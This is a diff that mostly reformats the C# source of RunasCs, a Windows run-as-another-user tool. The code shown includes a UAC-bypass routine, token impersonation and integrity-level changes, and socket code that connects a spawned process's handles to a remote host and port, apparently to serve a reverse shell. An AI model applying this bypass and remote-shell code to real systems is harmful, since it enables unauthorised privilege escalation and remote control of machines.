@@ -1,4 +1,4 @@
-using System;
+﻿using System;
 using System.Text;
 using System.Runtime.InteropServices;
 using System.Collections.Generic;
@@ -19,11 +19,11 @@ public class RunasCsException : Exception
         return errorMessage;
     }
 
-    public RunasCsException(){}
+    public RunasCsException() { }
 
     public RunasCsException(string message) : base(error_string + message) { }
 
-    public RunasCsException(string win32FunctionName, bool returnWin32Error) : base(error_string + win32FunctionName + " failed with error code: " + GetWin32ErrorString()) {}
+    public RunasCsException(string win32FunctionName, bool returnWin32Error) : base(error_string + win32FunctionName + " failed with error code: " + GetWin32ErrorString()) { }
 }
 
 public class RunasCs
@@ -31,7 +31,7 @@ public class RunasCs
     private const Int32 Startf_UseStdHandles = 0x00000100;
     private const int TokenPrimary = 1;
     private const int TokenImpersonation = 2;
-    private const int LOGON32_PROVIDER_DEFAULT = 0; 
+    private const int LOGON32_PROVIDER_DEFAULT = 0;
     private const int LOGON32_PROVIDER_WINNT50 = 3;
     private const int LOGON32_LOGON_INTERACTIVE = 2;
     private const int LOGON32_LOGON_NETWORK = 3;
@@ -56,47 +56,47 @@ public class RunasCs
     private IntPtr hOutputWrite;
     private WindowStationDACL stationDaclObj;
     private IntPtr hTokenPreviousImpersonatingThread;
-    
+
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     private struct STARTUPINFO
     {
-         public Int32 cb;
-         public string lpReserved;
-         public string lpDesktop;
-         public string lpTitle;
-         public Int32 dwX;
-         public Int32 dwY;
-         public Int32 dwXSize;
-         public Int32 dwYSize;
-         public Int32 dwXCountChars;
-         public Int32 dwYCountChars;
-         public Int32 dwFillAttribute;
-         public Int32 dwFlags;
-         public Int16 wShowWindow;
-         public Int16 cbReserved2;
-         public IntPtr lpReserved2;
-         public IntPtr hStdInput;
-         public IntPtr hStdOutput;
-         public IntPtr hStdError;
+        public Int32 cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public Int32 dwX;
+        public Int32 dwY;
+        public Int32 dwXSize;
+        public Int32 dwYSize;
+        public Int32 dwXCountChars;
+        public Int32 dwYCountChars;
+        public Int32 dwFillAttribute;
+        public Int32 dwFlags;
+        public Int16 wShowWindow;
+        public Int16 cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
     }
 
     private struct ProcessInformation
     {
         public IntPtr process;
         public IntPtr thread;
-        public int    processId;
-        public int    threadId;
+        public int processId;
+        public int threadId;
     }
-    
-    [StructLayout(LayoutKind.Sequential)] 
+
+    [StructLayout(LayoutKind.Sequential)]
     private struct SECURITY_ATTRIBUTES
     {
-        public int    Length;
+        public int Length;
         public IntPtr lpSecurityDescriptor;
-        public bool   bInheritHandle;
+        public bool bInheritHandle;
     }
-    
-    private enum SECURITY_IMPERSONATION_LEVEL 
+
+    private enum SECURITY_IMPERSONATION_LEVEL
     {
         SecurityAnonymous,
         SecurityIdentification,
@@ -162,13 +162,13 @@ public class RunasCs
         public IntPtr hProfile;
     }
 
-    [DllImport("Kernel32.dll", SetLastError=true)]
+    [DllImport("Kernel32.dll", SetLastError = true)]
     private static extern bool CloseHandle(IntPtr handle);
-    
-    [DllImport("Kernel32.dll", SetLastError=true)]
+
+    [DllImport("Kernel32.dll", SetLastError = true)]
     private static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 milliseconds);
 
-    [DllImport("advapi32.dll", SetLastError=true)]
+    [DllImport("advapi32.dll", SetLastError = true)]
     private static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
 
     [DllImport("advapi32.dll", SetLastError = true)]
@@ -179,12 +179,12 @@ public class RunasCs
 
     [DllImport("advapi32.dll", SetLastError = true)]
     private static extern bool RevertToSelf();
-    
+
     [DllImport("advapi32.dll", SetLastError = true, BestFitMapping = false, ThrowOnUnmappableChar = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool LogonUser([MarshalAs(UnmanagedType.LPStr)] string pszUserName,[MarshalAs(UnmanagedType.LPStr)] string pszDomain,[MarshalAs(UnmanagedType.LPStr)] string pszPassword,int dwLogonType,int dwLogonProvider,ref IntPtr phToken);
-    
-    [DllImport("advapi32.dll", EntryPoint="DuplicateTokenEx", SetLastError = true)]
+    private static extern bool LogonUser([MarshalAs(UnmanagedType.LPStr)] string pszUserName, [MarshalAs(UnmanagedType.LPStr)] string pszDomain, [MarshalAs(UnmanagedType.LPStr)] string pszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);
+
+    [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx", SetLastError = true)]
     private static extern bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, IntPtr lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, int TokenType, ref IntPtr DuplicateTokenHandle);
 
     [DllImport("advapi32.dll", SetLastError = true)]
@@ -194,11 +194,11 @@ public class RunasCs
     [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = "CreateProcess")]
     private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out ProcessInformation lpProcessInformation);
 
-    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
-    private static extern bool CreateProcessWithLogonW(String userName,String domain,String password,UInt32 logonFlags,String applicationName,String commandLine,uint creationFlags,UInt32 environment,String currentDirectory,ref STARTUPINFO startupInfo,out  ProcessInformation processInformation);
-    
-    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
-    private static extern bool CreateProcessAsUser(IntPtr hToken,string lpApplicationName,string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,bool bInheritHandles,uint dwCreationFlags,IntPtr lpEnvironment,string lpCurrentDirectory,ref STARTUPINFO lpStartupInfo,out ProcessInformation lpProcessInformation);  
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    private static extern bool CreateProcessWithLogonW(String userName, String domain, String password, UInt32 logonFlags, String applicationName, String commandLine, uint creationFlags, UInt32 environment, String currentDirectory, ref STARTUPINFO startupInfo, out ProcessInformation processInformation);
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    private static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out ProcessInformation lpProcessInformation);
 
     [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
     private static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out ProcessInformation lpProcessInformation);
@@ -215,14 +215,14 @@ public class RunasCs
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
 
-    [DllImport("kernel32.dll", SetLastError=true)]
+    [DllImport("kernel32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);
 
-    [DllImport("userenv.dll", SetLastError=true, CharSet = CharSet.Auto)]
-    private static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit );
+    [DllImport("userenv.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    private static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);
 
-    [DllImport("userenv.dll", SetLastError=true, CharSet = CharSet.Auto)]
+    [DllImport("userenv.dll", SetLastError = true, CharSet = CharSet.Auto)]
     private static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment);
 
     [DllImport("userenv.dll", SetLastError = true, CharSet = CharSet.Auto)]
@@ -246,20 +246,21 @@ public class RunasCs
     [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
     private static extern Int32 WSAGetLastError();
 
-    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError=true)]
+    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern Int32 WSAStartup(Int16 wVersionRequested, out WSAData wsaData);
 
     [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
     private static extern int closesocket(IntPtr s);
-    
-    private string GetProcessFunction(int createProcessFunction){
-        if(createProcessFunction == 0)
+
+    private string GetProcessFunction(int createProcessFunction)
+    {
+        if (createProcessFunction == 0)
             return "CreateProcessAsUserW()";
-        if(createProcessFunction == 1)
+        if (createProcessFunction == 1)
             return "CreateProcessWithTokenW()";
         return "CreateProcessWithLogonW()";
     }
-    
+
     private bool CreateAnonymousPipeEveryoneAccess(ref IntPtr hReadPipe, ref IntPtr hWritePipe)
     {
         SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
@@ -270,13 +271,14 @@ public class RunasCs
             return true;
         return false;
     }
-    
+
     private string ReadOutputFromPipe(IntPtr hReadPipe)
     {
         string output = "";
         uint dwBytesRead = 0;
         byte[] buffer = new byte[BUFFER_SIZE_PIPE];
-        if(!ReadFile(hReadPipe, buffer, BUFFER_SIZE_PIPE, out dwBytesRead, IntPtr.Zero)){
+        if (!ReadFile(hReadPipe, buffer, BUFFER_SIZE_PIPE, out dwBytesRead, IntPtr.Zero))
+        {
             output += "No output received from the process.\r\n";
         }
         output += Encoding.Default.GetString(buffer, 0, (int)dwBytesRead);
@@ -289,14 +291,18 @@ public class RunasCs
         int error = 0;
         string host = remote[0];
 
-        try {
+        try
+        {
             port = Convert.ToInt32(remote[1]);
-        } catch {
+        }
+        catch
+        {
             throw new RunasCsException("Specified port is invalid: " + remote[1]);
         }
 
         WSAData data;
-        if( WSAStartup(2 << 8 | 2, out data) != 0 ) {
+        if (WSAStartup(2 << 8 | 2, out data) != 0)
+        {
             error = WSAGetLastError();
             throw new RunasCsException(String.Format("WSAStartup failed with error code: {0}", error));
         }
@@ -309,7 +315,8 @@ public class RunasCs
         sockinfo.sin_addr = BitConverter.ToUInt32(((IPAddress.Parse(host)).GetAddressBytes()), 0);
         sockinfo.sin_port = (short)htons((ushort)port);
 
-        if ( connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0 ) {
+        if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0)
+        {
             error = WSAGetLastError();
             throw new RunasCsException(String.Format("WSAConnect failed with error code: {0}", error));
         }
@@ -317,7 +324,8 @@ public class RunasCs
         return socket;
     }
 
-    private bool ImpersonateLoggedOnUserWithProperIL(IntPtr hToken, out IntPtr hTokenDuplicate) {
+    private bool ImpersonateLoggedOnUserWithProperIL(IntPtr hToken, out IntPtr hTokenDuplicate)
+    {
         IntPtr hTokenDuplicateLocal = new IntPtr(0);
         bool result = false;
         // if our main thread was already impersonating remember to restore the previous thread token
@@ -325,16 +333,17 @@ public class RunasCs
             this.hTokenPreviousImpersonatingThread = WindowsIdentity.GetCurrent(true).Token;
         if (!DuplicateTokenEx(hToken, AccessToken.TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TokenImpersonation, ref hTokenDuplicateLocal))
             throw new RunasCsException("DuplicateTokenEx", true);
-        if(AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token) < AccessToken.GetTokenIntegrityLevel(hTokenDuplicateLocal))
+        if (AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token) < AccessToken.GetTokenIntegrityLevel(hTokenDuplicateLocal))
             AccessToken.SetTokenIntegrityLevel(hTokenDuplicateLocal, AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token));
         result = ImpersonateLoggedOnUser(hTokenDuplicateLocal);
         hTokenDuplicate = hTokenDuplicateLocal;
         return result;
     }
 
-    private void RevertToSelfCustom() {
+    private void RevertToSelfCustom()
+    {
         RevertToSelf();
-        if (this.hTokenPreviousImpersonatingThread != IntPtr.Zero) 
+        if (this.hTokenPreviousImpersonatingThread != IntPtr.Zero)
             ImpersonateLoggedOnUser(this.hTokenPreviousImpersonatingThread);
     }
 
@@ -344,7 +353,8 @@ public class RunasCs
         lpEnvironment = new IntPtr(0);
         PROFILEINFO profileInfo = new PROFILEINFO();
         IntPtr hTokenDuplicate;
-        if (forceProfileCreation || userProfileExists) {
+        if (forceProfileCreation || userProfileExists)
+        {
             profileInfo.dwSize = Marshal.SizeOf(profileInfo);
             profileInfo.lpUserName = username;
             result = LoadUserProfile(hToken, ref profileInfo);
@@ -352,10 +362,12 @@ public class RunasCs
                 Console.Out.WriteLine("[*] Warning: LoadUserProfile failed due to insufficient permissions");
         }
         ImpersonateLoggedOnUserWithProperIL(hToken, out hTokenDuplicate);
-        try {
+        try
+        {
             CreateEnvironmentBlock(out lpEnvironment, hToken, false);
         }
-        catch {
+        catch
+        {
             result = false;
         }
         RevertToSelfCustom();
@@ -363,7 +375,8 @@ public class RunasCs
         if (result && (forceProfileCreation || userProfileExists)) UnloadUserProfile(hToken, profileInfo.hProfile);
     }
 
-    private bool IsUserProfileCreated(string username, string password, string domainName, int logonType) {
+    private bool IsUserProfileCreated(string username, string password, string domainName, int logonType)
+    {
         bool result = false;
         IntPtr hToken = IntPtr.Zero, hTokenDuplicate = IntPtr.Zero;
         int logonProvider = LOGON32_PROVIDER_DEFAULT;
@@ -379,7 +392,8 @@ public class RunasCs
             StringBuilder profileDir = new StringBuilder(dwSize);
             result = GetUserProfileDirectory(hToken, profileDir, ref dwSize);
         }
-        catch {
+        catch
+        {
             result = false;
         }
         RevertToSelfCustom();
@@ -390,7 +404,8 @@ public class RunasCs
 
     // UAC bypass discussed in this UAC quiz tweet --> https://twitter.com/splinter_code/status/1458054161472307204
     // thanks @winlogon0 for the implementation --> https://github.com/AltF5/MediumToHighIL_Test/blob/main/TestCode2.cs
-    private bool CreateProcessWithLogonWUacBypass(int logonType, uint logonFlags, string username, string domainName, string password, string processPath, string commandLine, ref STARTUPINFO startupInfo, out ProcessInformation processInfo) {
+    private bool CreateProcessWithLogonWUacBypass(int logonType, uint logonFlags, string username, string domainName, string password, string processPath, string commandLine, ref STARTUPINFO startupInfo, out ProcessInformation processInfo)
+    {
         bool result = false;
         IntPtr hToken = new IntPtr(0);
         if (!LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_DEFAULT, ref hToken))
@@ -409,21 +424,25 @@ public class RunasCs
         return result;
     }
 
-    private string ParseCommonProcessesInCommandline(string commandline) {
+    private string ParseCommonProcessesInCommandline(string commandline)
+    {
         string commandlineRet = commandline;
         string[] args = commandline.Split(' ');
-        if (args[0].ToLower() == "cmd" || args[0].ToLower() == "cmd.exe") {
+        if (args[0].ToLower() == "cmd" || args[0].ToLower() == "cmd.exe")
+        {
             args[0] = Environment.GetEnvironmentVariable("COMSPEC");
             commandlineRet = string.Join(" ", args);
         }
-        if (args[0].ToLower() == "powershell" || args[0].ToLower() == "powershell.exe") {
+        if (args[0].ToLower() == "powershell" || args[0].ToLower() == "powershell.exe")
+        {
             args[0] = Environment.GetEnvironmentVariable("WINDIR") + @"\System32\WindowsPowerShell\v1.0\powershell.exe";
             commandlineRet = string.Join(" ", args);
         }
         return commandlineRet;
     }
 
-    private bool IsLimitedUserLogon(IntPtr hToken, string username, string domainName, string password, out int logonTypeNotFiltered) {
+    private bool IsLimitedUserLogon(IntPtr hToken, string username, string domainName, string password, out int logonTypeNotFiltered)
+    {
         bool isLimitedUserLogon = false;
         bool isTokenUACFiltered = false;
         IntPtr hTokenNetwork = IntPtr.Zero;
@@ -436,7 +455,8 @@ public class RunasCs
             logonTypeNotFiltered = LOGON32_LOGON_NETWORK_CLEARTEXT;
             isLimitedUserLogon = true;
         }
-        else {
+        else
+        {
             // Check differences between the requested logon type and non-filtered logon types (Network, Batch, Service)
             // If IL mismatch, the user has potentially more privileges than the requested logon
             AccessToken.IntegrityLevel userTokenIL = AccessToken.GetTokenIntegrityLevel(hToken);
@@ -463,16 +483,20 @@ public class RunasCs
         return isLimitedUserLogon;
     }
 
-    private void CheckAvailableUserLogonType(string username, string password, string domainName, int logonType, int logonProvider) {
+    private void CheckAvailableUserLogonType(string username, string password, string domainName, int logonType, int logonProvider)
+    {
         IntPtr hTokenCheck1 = IntPtr.Zero;
-        if (!LogonUser(username, domainName, password, logonType, logonProvider, ref hTokenCheck1)) {
-            if (Marshal.GetLastWin32Error() == ERROR_LOGON_TYPE_NOT_GRANTED) {
+        if (!LogonUser(username, domainName, password, logonType, logonProvider, ref hTokenCheck1))
+        {
+            if (Marshal.GetLastWin32Error() == ERROR_LOGON_TYPE_NOT_GRANTED)
+            {
                 int availableLogonType = 0;
-                int[] logonTypeTryOrder = new int[] { LOGON32_LOGON_SERVICE, LOGON32_LOGON_BATCH, LOGON32_LOGON_NETWORK_CLEARTEXT, LOGON32_LOGON_NETWORK, LOGON32_LOGON_INTERACTIVE};
+                int[] logonTypeTryOrder = new int[] { LOGON32_LOGON_SERVICE, LOGON32_LOGON_BATCH, LOGON32_LOGON_NETWORK_CLEARTEXT, LOGON32_LOGON_NETWORK, LOGON32_LOGON_INTERACTIVE };
                 foreach (int logonTypeTry in logonTypeTryOrder)
                 {
                     IntPtr hTokenCheck2 = IntPtr.Zero;
-                    if (LogonUser(username, domainName, password, logonTypeTry, logonProvider, ref hTokenCheck2)) {
+                    if (LogonUser(username, domainName, password, logonTypeTry, logonProvider, ref hTokenCheck2))
+                    {
                         availableLogonType = logonTypeTry;
                         if (AccessToken.GetTokenIntegrityLevel(hTokenCheck2) > AccessToken.IntegrityLevel.Medium)
                         {
@@ -493,7 +517,8 @@ public class RunasCs
         if (hTokenCheck1 != IntPtr.Zero) CloseHandle(hTokenCheck1);
     }
 
-    private void RunasSetupStdHandlesForProcess(uint processTimeout, string[] remote, ref STARTUPINFO startupInfo, out IntPtr hOutputWrite, out IntPtr hErrorWrite, out IntPtr hOutputRead, out IntPtr socket) {
+    private void RunasSetupStdHandlesForProcess(uint processTimeout, string[] remote, ref STARTUPINFO startupInfo, out IntPtr hOutputWrite, out IntPtr hErrorWrite, out IntPtr hOutputRead, out IntPtr socket)
+    {
         IntPtr hOutputReadTmpLocal = IntPtr.Zero;
         IntPtr hOutputWriteLocal = IntPtr.Zero;
         IntPtr hErrorWriteLocal = IntPtr.Zero;
@@ -531,7 +556,8 @@ public class RunasCs
         socket = socketLocal;
     }
 
-    private void RunasRemoteImpersonation(string username, string domainName, string password, int logonType, int logonProvider, string commandLine, ref STARTUPINFO startupInfo, ref ProcessInformation processInfo, ref int logonTypeNotFiltered) {
+    private void RunasRemoteImpersonation(string username, string domainName, string password, int logonType, int logonProvider, string commandLine, ref STARTUPINFO startupInfo, ref ProcessInformation processInfo, ref int logonTypeNotFiltered)
+    {
         IntPtr hToken = IntPtr.Zero;
         IntPtr hTokenDupImpersonation = IntPtr.Zero;
         IntPtr lpEnvironment = IntPtr.Zero;
@@ -565,7 +591,8 @@ public class RunasCs
         if (lpEnvironment != IntPtr.Zero) DestroyEnvironmentBlock(lpEnvironment);
     }
 
-    private void RunasCreateProcessWithLogonW(string username, string domainName, string password, int logonType, uint logonFlags, string commandLine, bool bypassUac, ref STARTUPINFO startupInfo, ref ProcessInformation processInfo, ref int logonTypeNotFiltered) {
+    private void RunasCreateProcessWithLogonW(string username, string domainName, string password, int logonType, uint logonFlags, string commandLine, bool bypassUac, ref STARTUPINFO startupInfo, ref ProcessInformation processInfo, ref int logonTypeNotFiltered)
+    {
         if (logonType == LOGON32_LOGON_NEW_CREDENTIALS)
         {
             if (!CreateProcessWithLogonW(username, domainName, password, LOGON_NETCREDENTIALS_ONLY, null, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo))
@@ -592,7 +619,7 @@ public class RunasCs
                 Console.Out.WriteLine("[*] Warning: The function CreateProcessWithLogonW is not compatible with the requested logon type '" + logonType.ToString() + "'. Reverting to the Interactive logon type '2'. To force a specific logon type, use the flag combination --remote-impersonation and --logon-type.");
             // we check if the user has been granted the logon type requested, if not we show a message suggesting which logon type can be used to succesfully logon
             CheckAvailableUserLogonType(username, password, domainName, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT);
-            // we use the logon type 2 - Interactive because CreateProcessWithLogonW internally use this logon type for the logon 
+            // we use the logon type 2 - Interactive because CreateProcessWithLogonW internally use this logon type for the logon
             if (!LogonUser(username, domainName, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, ref hTokenUacCheck))
                 throw new RunasCsException("LogonUser", true);
             if (IsLimitedUserLogon(hTokenUacCheck, username, domainName, password, out logonTypeNotFiltered))
@@ -603,7 +630,8 @@ public class RunasCs
         }
     }
 
-    private void RunasCreateProcessWithTokenW(string username, string domainName, string password, string commandLine, int logonType, uint logonFlags, int logonProvider, ref STARTUPINFO startupInfo, ref ProcessInformation processInfo, ref int logonTypeNotFiltered) {
+    private void RunasCreateProcessWithTokenW(string username, string domainName, string password, string commandLine, int logonType, uint logonFlags, int logonProvider, ref STARTUPINFO startupInfo, ref ProcessInformation processInfo, ref int logonTypeNotFiltered)
+    {
         IntPtr hToken = IntPtr.Zero;
         IntPtr hTokenDuplicate = IntPtr.Zero;
         if (!LogonUser(username, domainName, password, logonType, logonProvider, ref hToken))
@@ -622,7 +650,8 @@ public class RunasCs
         CloseHandle(hTokenDuplicate);
     }
 
-    private void RunasCreateProcessAsUserW(string username, string domainName, string password, int logonType, int logonProvider, string commandLine, bool forceUserProfileCreation, bool userProfileExists, ref STARTUPINFO startupInfo, ref ProcessInformation processInfo, ref int logonTypeNotFiltered) {
+    private void RunasCreateProcessAsUserW(string username, string domainName, string password, int logonType, int logonProvider, string commandLine, bool forceUserProfileCreation, bool userProfileExists, ref STARTUPINFO startupInfo, ref ProcessInformation processInfo, ref int logonTypeNotFiltered)
+    {
         IntPtr hToken = IntPtr.Zero;
         IntPtr hTokenDuplicate = IntPtr.Zero;
         IntPtr lpEnvironment = IntPtr.Zero;
@@ -657,11 +686,11 @@ public class RunasCs
 
     public void CleanupHandles()
     {
-        if(this.hOutputRead != IntPtr.Zero) CloseHandle(this.hOutputRead);
-        if(this.hOutputWrite != IntPtr.Zero) CloseHandle(this.hOutputWrite);
-        if(this.hErrorWrite != IntPtr.Zero) CloseHandle(this.hErrorWrite);
-        if(this.socket != IntPtr.Zero) closesocket(this.socket);
-        if(this.stationDaclObj != null) this.stationDaclObj.CleanupHandles();
+        if (this.hOutputRead != IntPtr.Zero) CloseHandle(this.hOutputRead);
+        if (this.hOutputWrite != IntPtr.Zero) CloseHandle(this.hOutputWrite);
+        if (this.hErrorWrite != IntPtr.Zero) CloseHandle(this.hErrorWrite);
+        if (this.socket != IntPtr.Zero) closesocket(this.socket);
+        if (this.stationDaclObj != null) this.stationDaclObj.CleanupHandles();
         this.hOutputRead = IntPtr.Zero;
         this.hOutputWrite = IntPtr.Zero;
         this.hErrorWrite = IntPtr.Zero;
@@ -692,17 +721,19 @@ public class RunasCs
         string desktopName = this.stationDaclObj.AddAclToActiveWindowStation(domainName, username, logonType);
         startupInfo.lpDesktop = desktopName;
         // setup proper logon provider for new credentials (9) logons
-        if (logonType == LOGON32_LOGON_NEW_CREDENTIALS) {
+        if (logonType == LOGON32_LOGON_NEW_CREDENTIALS)
+        {
             logonProvider = LOGON32_PROVIDER_WINNT50;
             if (domainName == "") // fixing bugs in seclogon when using LOGON32_LOGON_NEW_CREDENTIALS...
                 domainName = ".";
-        } 
+        }
         // we check if the user has been granted the logon type requested, if not we show a message suggesting which logon type can be used to succesfully logon
         CheckAvailableUserLogonType(username, password, domainName, logonType, logonProvider);
         // Use the proper CreateProcess* function
         if (remoteImpersonation)
             RunasRemoteImpersonation(username, domainName, password, logonType, logonProvider, commandLine, ref startupInfo, ref processInfo, ref logonTypeNotFiltered);
-        else {
+        else
+        {
             bool userProfileExists;
             uint logonFlags = 0;
             userProfileExists = IsUserProfileCreated(username, password, domainName, logonType);
@@ -725,14 +756,17 @@ public class RunasCs
         }
         Console.Out.Flush();  // flushing console before waiting for child process execution
         string output = "";
-        if (processTimeout > 0) {
+        if (processTimeout > 0)
+        {
             CloseHandle(this.hOutputWrite);
             CloseHandle(this.hErrorWrite);
             this.hOutputWrite = IntPtr.Zero;
             this.hErrorWrite = IntPtr.Zero;
             WaitForSingleObject(processInfo.process, processTimeout);
             output += "\r\n" + ReadOutputFromPipe(this.hOutputRead);
-        } else {
+        }
+        else
+        {
             int sessionId = System.Diagnostics.Process.GetCurrentProcess().SessionId;
             if (remoteImpersonation)
                 output += "\r\n[+] Running in session " + sessionId.ToString() + " with process function 'Remote Impersonation' \r\n";
@@ -748,8 +782,9 @@ public class RunasCs
     }
 }
 
-public class WindowStationDACL{
-   
+public class WindowStationDACL
+{
+
     private const int UOI_NAME = 2;
     private const int ERROR_INSUFFICIENT_BUFFER = 122;
     private const uint SECURITY_DESCRIPTOR_REVISION = 1;
@@ -762,7 +797,7 @@ public class WindowStationDACL{
     private const byte NO_PROPAGATE_INHERIT_ACE = 0x4;
     private const int NO_ERROR = 0;
     private const int ERROR_INVALID_FLAGS = 1004; // On Windows Server 2003 this error is/can be returned, but processing can still continue
-    
+
     [Flags]
     private enum ACCESS_MASK : uint
     {
@@ -815,34 +850,34 @@ public class WindowStationDACL{
         WINSTA_EXITWINDOWS = 0x00000040,
         WINSTA_ENUMERATE = 0x00000100,
         WINSTA_READSCREEN = 0x00000200,
-        WINSTA_ALL =  (WINSTA_ACCESSCLIPBOARD  | WINSTA_ACCESSGLOBALATOMS | 
-                   WINSTA_CREATEDESKTOP    | WINSTA_ENUMDESKTOPS      | 
-                   WINSTA_ENUMERATE        | WINSTA_EXITWINDOWS       | 
-                   WINSTA_READATTRIBUTES   | WINSTA_READSCREEN        | 
-                   WINSTA_WRITEATTRIBUTES  | DELETE                   | 
-                   READ_CONTROL            | WRITE_DAC                | 
+        WINSTA_ALL = (WINSTA_ACCESSCLIPBOARD | WINSTA_ACCESSGLOBALATOMS |
+                   WINSTA_CREATEDESKTOP | WINSTA_ENUMDESKTOPS |
+                   WINSTA_ENUMERATE | WINSTA_EXITWINDOWS |
+                   WINSTA_READATTRIBUTES | WINSTA_READSCREEN |
+                   WINSTA_WRITEATTRIBUTES | DELETE |
+                   READ_CONTROL | WRITE_DAC |
                    WRITE_OWNER)
     }
-    
-    [Flags] 
+
+    [Flags]
     private enum SECURITY_INFORMATION : uint
     {
-        OWNER_SECURITY_INFORMATION        = 0x00000001,
-        GROUP_SECURITY_INFORMATION        = 0x00000002,
-        DACL_SECURITY_INFORMATION         = 0x00000004,
-        SACL_SECURITY_INFORMATION         = 0x00000008,
+        OWNER_SECURITY_INFORMATION = 0x00000001,
+        GROUP_SECURITY_INFORMATION = 0x00000002,
+        DACL_SECURITY_INFORMATION = 0x00000004,
+        SACL_SECURITY_INFORMATION = 0x00000008,
         UNPROTECTED_SACL_SECURITY_INFORMATION = 0x10000000,
         UNPROTECTED_DACL_SECURITY_INFORMATION = 0x20000000,
-        PROTECTED_SACL_SECURITY_INFORMATION   = 0x40000000,
-        PROTECTED_DACL_SECURITY_INFORMATION   = 0x80000000
+        PROTECTED_SACL_SECURITY_INFORMATION = 0x40000000,
+        PROTECTED_DACL_SECURITY_INFORMATION = 0x80000000
     }
-    
+
     private enum ACL_INFORMATION_CLASS
     {
         AclRevisionInformation = 1,
         AclSizeInformation = 2
     }
-    
+
     private enum SID_NAME_USE
     {
         SidTypeUser = 1,
@@ -855,14 +890,14 @@ public class WindowStationDACL{
         SidTypeUnknown,
         SidTypeComputer
     }
-    
+
     [StructLayout(LayoutKind.Sequential)]
     private struct SidIdentifierAuthority
     {
         [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6, ArraySubType = UnmanagedType.I1)]
         public byte[] Value;
     }
-    
+
     [StructLayout(LayoutKind.Sequential)]
     private struct ACL_SIZE_INFORMATION
     {
@@ -870,7 +905,7 @@ public class WindowStationDACL{
         public uint AclBytesInUse;
         public uint AclBytesFree;
     }
-    
+
     [StructLayout(LayoutKind.Sequential)]
     private struct ACE_HEADER
     {
@@ -878,7 +913,7 @@ public class WindowStationDACL{
         public byte AceFlags;
         public short AceSize;
     }
-    
+
     [StructLayout(LayoutKind.Sequential)]
     private struct ACCESS_ALLOWED_ACE
     {
@@ -886,93 +921,94 @@ public class WindowStationDACL{
         public ACCESS_MASK Mask;
         public uint SidStart;
     }
-    
+
     [DllImport("user32", CharSet = CharSet.Unicode, SetLastError = true)]
     private static extern IntPtr GetProcessWindowStation();
 
-    [DllImport("user32.dll", SetLastError=true)]
-    private static extern bool GetUserObjectInformation(IntPtr hObj, int nIndex,[Out] byte [] pvInfo, uint nLength, out uint lpnLengthNeeded);
+    [DllImport("user32.dll", SetLastError = true)]
+    private static extern bool GetUserObjectInformation(IntPtr hObj, int nIndex, [Out] byte[] pvInfo, uint nLength, out uint lpnLengthNeeded);
 
     [DllImport("user32", CharSet = CharSet.Unicode, SetLastError = true)]
